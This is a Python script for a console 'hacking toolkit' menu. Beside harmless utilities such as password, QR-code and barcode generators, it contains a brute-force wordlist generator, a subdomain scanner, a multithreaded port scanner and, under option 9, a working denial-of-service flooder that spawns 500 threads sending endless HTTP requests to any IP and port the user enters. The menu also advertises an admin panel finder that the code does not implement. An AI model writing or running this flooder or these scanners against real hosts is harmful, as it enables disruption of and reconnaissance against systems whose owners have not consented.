#python

import os
import time
from tqdm import *
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

def loading():
    for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
        time.sleep(0.01)
    print("LOADING DONE!")

def font(text):
    cool_text = Figlet(font="slant")
    return str(cool_text.renderText(text))

def window_size(columns=750, height=30):
    os.system("cls")
    os.system(f'mode con: cols={columns} lines={height}')

def main():
    window_size(80, 20)
    result = pyfiglet.figlet_format("STRANGE", font="5lineoblique")
    print(result)

    options = """
    1- MY IP ADDRESS
    2- PASSWORD GENERATOR
    3- WORDLIST GENERATOR
    4- BARCODE GENERATOR
    5- QRCODE GENERATOR
    6- PHONE NUMBER INFO
    7- SUBDOMAIN SCANNER
    8- PORT SCANNER
    9- DDOS ATTACK
    10- ADMIN PANEL FINDER
    """

    print(options)

    while True:
        select = int(input("ENTER YOUR CHOICE >>>>>--------> "))

        if select == 1:
            window_size(80, 20)
            print(font("FIND MY IP"))
            loading()
            
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            print("Your device is: " + hostname)
            print("YOUR IP ADDRESS IS: " + IPAddr)
            input("PRESS ENTER TO EXIT")

        elif select == 2:
            window_size(80, 20)
            print(font("PASSWORD GENERATOR"))
            loading()
            
            length = int(input("ENTER THE LENGTH OF THE PASSWORD >>>>>--------> "))
            lower = "abcdefghijklmnopqrstuvwxyz"
            upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            numbers = "1234567890"
            symbols = "@#&*(){}[]/?"
            all_chars = lower + symbols + numbers + upper
            password = "".join(random.sample(all_chars, length))
            print("GENERATED PASSWORD OF LENGTH", length, "is", password)
            input("PRESS ENTER TO EXIT")

        elif select == 3:
            window_size(80, 20)
            print(font("WORDLIST GENERATOR"))
            loading()
            
            print("GENERATOR PASSWORD IS SAVED IN THE PRESENT FOLDER/DIRECTORY")
            chrs = input("ENTER THE LETTERS FOR COMBINATION >>>>>--------> ")
            min_len = int(input("MINIMUM LENGTH OF PASSWORD >>>>>--------> "))
            max_len = int(input("MAXIMUM LENGTH OF PASSWORD >>>>>--------> "))
            filename = input("[+] ENTER THE NAME OF THE FILE >>>>>--------> ")
            
            input('ARE YOU READY? [Press Enter]')
            start = time.time()
            
            with open(filename, 'w') as psd:
                for i in range(min_len, max_len + 1):
                    for xs in itertools.product(chrs, repeat=i):
                        psd.write(''.join(xs) + '\n')
            
            end = time.time()
            print("\nDONE SUCCESS")
            print(f"Total time: {end - start:.2f} seconds")
            input("PRESS ENTER TO EXIT")

        elif select == 4:
            window_size(80, 20)
            print(font("BARCODE GENERATOR"))
            loading()
            
            print("GENERATOR BARCODE WILL BE SAVED AS PNG FILE IN THE PRESENT DIRECTORY")
            number = input("ENTER 12 DIGIT NUMBER TO GENERATE BARCODE >>>>>--------> ")
            my_code = EAN13(number, writer=ImageWriter())
            my_code.save("bar_code")
            input("PRESS ENTER TO EXIT")

        elif select == 5:
            window_size(80, 20)
            print(font("QRCODE GENERATOR"))
            loading()
            
            print("GENERATOR QR CODE WILL BE SAVED AS myqr.png IN THE PRESENT DIRECTORY")
            s = input("ENTER THE LINK TO CREATE A QRCODE >>>>>--------> ")
            url = pyqrcode.create(s)
            url.svg("myqr.svg", scale=8)
            url.png('myqr.png', scale=6)
            input("PRESS ENTER TO EXIT")

        elif select == 6:
            window_size(80, 20)
            print(font("PHONE NUMBER SCANNER"))
            loading()
            
            number = input("ENTER THE NUMBER >>>>>--------> ")
            parsed_number = phonenumbers.parse(number)
            description = geocoder.description_for_number(parsed_number, 'en')
            supplier = carrier.name_for_number(parsed_number, 'en')
            info = [["Country", description],
                   ["Supplier", supplier]]
            print(tabulate(info, headers="firstrow", tablefmt="github"))
            input("PRESS ENTER TO EXIT")

        elif select == 7:
            window_size(80, 20)
            print(font("SUBDOMAIN SCANNER"))
            loading()
            
            print("IT TAKES TIME ACCORDING TO THE DOMAIN")
            print("USING DEFAULT ADDED WORDLIST WITH 649649 WORD")
            domain = input("ENTER THE DOMAIN TO SCAN >>>>>--------> ")
            
            with open("subdomains.txt") as file:
                subdomains = file.read().splitlines()
            
            for subdomain in subdomains:
                url = f"http://{subdomain}.{domain}"
                try:
                    requests.get(url)
                    print("[+] Discovered subdomain:", url)
                except requests.ConnectionError:
                    pass
            input("PRESS ENTER TO EXIT")

        elif select == 8:
            window_size(80, 20)
            print(font("PORT SCANNER"))
            loading()
            
            print("KEEP SOME PATIENCE, IT TAKES TIME ACCORDING TO THE OPEN PORTS AND PROVIDED IP")
            target = input("ENTER THE IP ADDRESS TO SCAN >>>>>--------> ")
            queue = Queue()
            open_ports = []

            def portscan(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, port))
                    return True
                except:
                    return False

            def worker():
                while not queue.empty():
                    port = queue.get()
                    if portscan(port):
                        print("Port {} is open!".format(port))
                        open_ports.append(port)

            for port in range(1, 1024):
                queue.put(port)

            thread_list = []
            for t in range(100):
                thread = threading.Thread(target=worker)
                thread_list.append(thread)
                thread.start()

            for thread in thread_list:
                thread.join()

            print("\nOpen ports are:", open_ports)
            input("PRESS ENTER TO EXIT")

        elif select == 9:
            window_size(80, 20)
            print(font("DDOS"))
            loading()
            
            target = input("ENTER THE IP ADDRESS >>>>>--------> ")
            port = int(input("ENTER THE PORT >>>>>-------------> "))
            fake_ip = "181.4.20.196"
            already_connected = 0

            def attack():
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((target, port))
                        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                        s.close()
                        global already_connected
                        already_connected += 1
                        if already_connected % 500 == 0:
                            print(already_connected)
                    except:
                        pass

            for i in range(500):
                thread = threading.Thread(target=attack)
                thread.start()
            input("PRESS ENTER TO EXIT")

        else:
            print("Invalid option selected")

if __name__ == "__main__":
    main()